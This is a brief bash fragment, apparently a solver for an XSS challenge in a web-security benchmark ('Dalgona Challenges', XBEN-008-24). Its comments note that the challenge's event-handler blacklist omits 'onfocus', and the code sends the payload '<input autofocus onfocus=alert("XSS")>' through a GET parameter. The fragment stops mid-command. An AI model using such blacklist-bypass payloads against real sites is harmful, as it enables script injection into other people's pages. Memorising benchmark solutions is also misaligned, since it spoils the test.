#!/usr/bin/env bash
# XBEN-008-24 — "Dalgona Challenges", star (tags: xss)
#
# XBEN-004 through a GET parameter: the same handler blacklist, missing
# `onfocus`, and the same checker that dispatches focus for you.
#
...
seq="$("$H5I" websec replay req_0 --create  \
    --set 'query.name=<input autofocus onfocus=alert("XSS")>' \
